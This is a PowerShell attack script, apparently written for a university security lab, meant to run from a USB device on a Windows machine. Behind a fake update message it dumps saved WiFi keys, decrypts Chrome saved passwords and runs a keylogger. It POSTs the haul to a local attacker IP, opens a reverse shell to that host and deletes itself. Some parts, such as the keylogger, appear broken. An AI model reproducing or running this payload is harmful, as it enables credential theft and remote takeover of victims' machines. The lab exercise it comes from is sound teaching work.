# Attaque USB pour lab INF8108 - Exfil WiFi, Chrome creds, keylog. Matricule: 2315529
$ErrorActionPreference = "SilentlyContinue"
Write-Host "Lancement d'une mise a jour systeme - Veuillez attendre..." # Faux message (originalité)
Start-Sleep -s (Get-Random -Min 1 -Max 10) # Délai random (furtivité)

# Extraction WiFi
$wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(':')[1].Trim() }
$wifipass = foreach ($p in $wifi) { (netsh wlan show profile name="$p" key=clear | Select-String "Key Content").ToString().Split(':')[1].Trim() }

# Extraction Chrome creds (gère AES pour Chrome 80+)
$localState = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" | ConvertFrom-Json
$masterKeyEnc = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key)
$masterKeyEnc = $masterKeyEnc[5..$masterKeyEnc.Length]
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($masterKeyEnc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "$env:TEMP\LoginData.db"
Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
$conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$env:TEMP\LoginData.db")
$conn.Open()
$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
$reader = $cmd.ExecuteReader()
$logins = @()
while ($reader.Read()) {
    $encPass = $reader.GetValue(2)
    if ($encPass[0..2] -eq [byte[]](118,49,48)) {
        $iv = $encPass[3..14]
        $payload = $encPass[15..($encPass.Length-17)]
        $tag = $encPass[($encPass.Length-16)..($encPass.Length-1)]
        Add-Type -AssemblyName System.Security
        $aes = New-Object System.Security.Cryptography.AesGcm($masterKey)
        $pass = New-Object byte[] $payload.Length
        $aes.Decrypt($iv, $payload, $tag, $pass)
        $password = [System.Text.Encoding]::UTF8.GetString($pass)
    } else {
        $password = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) -join ''
    }
    $logins += @{url=$reader.GetString(0); user=$reader.GetString(1); pass=$password}
}
$reader.Close()
$conn.Close()
Remove-Item "$env:TEMP\LoginData.db" # Nettoyage (furtivité)

# Keylogger simple (60s)
Add-Type -AssemblyName System.Windows.Forms
$keys = ''
for ($i=0; $i -lt 60; $i++) {
    Start-Sleep -m 100
    $keys += [System.Windows.Forms.SendKeys]::Flush()
}

# Payload et exfiltration
$payload = @{wifi=$wifipass; browser=$logins; keys=$keys; matricules='2315529'; victim_ip='192.168.2.140'}
Invoke-WebRequest -Uri 'http://192.168.2.154:8080' -Method POST -Body ($payload | ConvertTo-Json) -ContentType 'application/json'

# Reverse shell (originalité/persistance)
$client = New-Object System.Net.Sockets.TCPClient('192.168.2.154', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()

# Nettoyage final
Remove-Item $MyInvocation.MyCommand.Path -ErrorAction SilentlyContinue
